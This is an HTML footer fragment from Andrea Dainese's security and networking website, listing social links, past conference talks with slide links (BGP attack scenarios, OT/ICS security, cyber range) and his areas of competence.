href=https://www.linkedin.com/in/adainese/ title="LinkedIn profile" target=_blank rel=noreferrer><i class="fab fa-linkedin-in"></i></a></li><li><a href=https://twitter.com/adainese title="Twitter profile" target=_blank rel=noreferrer><i class="fab fa-twitter"></i></a></li><li><a href=mailto:andrea@adainese.it title="Secure email" target=_blank rel=noreferrer><i class="fa fa-envelope"></i></a></li><li><a href=https://www.spreaker.com/podcast/info-sec-unplugged--6025156 title=Podcast target=_blank rel=noreferrer><i class="fa fa-podcast"></i></a></li><li><a href=https://github.com/dainok/ title="GitHub repositories" target=_blank rel=noreferrer><i class="fab fa-github"></i></a></li><li><a href=/blog/index.xml title="RSS Feed" target=_blank><i class="fa fa-rss"></i></a></li></ul></div></div><div class="col-xs-12 col-sm-12 col-md-4"><div class=footer-head><h4>Past events</h4></div><div class=footer-content><ul><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20240305-cisco-aci-automation.pdf title="View slides" target=_blank rel=noreferrer>SDN: Software Defined Now</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20231122-cybercrime.pdf title="View slides" target=_blank rel=noreferrer>Cybercrime</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20220901-bgp-attack-scenarios.pdf title="View slides" target=_blank rel=noreferrer>BGP attack scenarios</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20220317-approaching-ot-ics-security.pdf title="View slides" target=_blank rel=noreferrer>Approaching OT/ICS Security</a> (with <a href=https://www.festocte.it/eventi/industry_4_0/17-03-2022/webinar_la_cybersecurity_nelle_reti_di_fabbrica_P/>Festo Academy</a>)</li><li><a href="https://www.youtube.com/watch?v=sjQZghTkHkA" title="View recording" target=_blank rel=noreferrer><i class="fa fa-video"></i></a>&nbsp;-&nbsp;<a href=/files/slides/20200922-cyberrange.pdf title="View slides" target=_blank rel=noreferrer>Cyber Range: Analyzing a Cyber Attack</a></li><li><a href="https://www.youtube.com/watch?v=-PWtGaS28dk" title="View recording" target=_blank rel=noreferrer><i class="fa fa-video"></i></a>&nbsp;-&nbsp;<a href=/files/slides/20200623-clubitfvg-securing-ot-ics-plants.pdf title="View slides" target=_blank rel=noreferrer>Securing OT/ICS plants</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20190226-automation-for-cisco-netops.pdf title="View slides" target=_blank rel=noreferrer>Automation for Cisco NetOps</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20181107-ciscon-sdn-complexity-and-tco-looking-for-an-easy-way.pdf title="View slides" target=_blank rel=noreferrer>SDN, Complexity and TCO</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20181003-nts-protection-and-visibility-for-enterprise-networks.pdf title="View slides" target=_blank rel=noreferrer>Protection and visibility for enterprise networks</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20141106-festival-ict-why-wan-accelerators-still-matter.pdf title="View slides" target=_blank rel=noreferrer>Why WAN AccelerAtors (still) matter?</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20130918-festival-ict-designing-an-hybrid-data-center-infrastructure.pdf title="View slides" target=_blank rel=noreferrer>Designing an Hybrid Data Center Infrastructure</a></li></ul></div></div><div class="d-none d-md-block col-md-4"><div class=footer-head><h4>Competencies</h4></div><div class=footer-slides><div class=footer-slide-container><div class=footer-slide><img src=/images/categories/security-125x100.webp alt="Incident Response"><div class=overlay>Incident Response</div></div></div><div class=footer-slide-container><div class=footer-slide><img src=/images/categories/ciso-125x100.webp alt=Advisor><div class=overlay>Advisor</div></div></div><div class=footer-slide-container><div class=footer-slide><img src=/images/categories/osint-125x100.webp alt="Open Source Intelligence (OSINT)"><div class=overlay>Open Source Intelligence (OSINT)</div></div></div><div class=footer-slide-container><div class=footer-slide><img src=/images/categories/infrastructure-125x100.webp alt="System Integration / Automation"><div class=overlay>System Integration / Automation</div></div></div><div class=footer-slide-container><div class=footer-slide><img src=/images/categories/writeup-125x100.webp alt="Training / Education / Cyber Range"><div class=overlay>Training / Education / Cyber Range</div></div></div><div class=footer-slide-container><div class=footer-slide><img src=/images/categories/personal-security-125x100.webp alt="Personal Security"><div class=overlay>Personal Security</div></div></div></div></div></div></div></div><div class=footer-copyright><div class=container><div class=row><div class="col-md-12 col-sm-12 col-xs-12"><div class=text-center>&copy; Copyright <strong>Andrea Dainese</strong>. All Rights Reserved</div><div class=text-center>Designed by <a href=https://bootstrapmade.com/ title=BootstrapMade target=_blank rel=noreferrer>BootstrapMade</a></div></div></div></div></div></footer><script src=/plugins/jquery/jquery.min.js></script>
<script src=/plugins/bootstrap/js/bootstrap.min.js></script>
<script src=/plugins/fancybox/jquery.fancybox.min.js></script>
<script src=/plugins/goodshare/goodshare.min.js></script>
<script src=/plugins/fuse/fuse.min.js></script>
<script src=/plugins/jquery-mark/jquery.mark.min.js></script>
<script src=/js/main.js></script>
<script src=/js/search.js></script></body></html>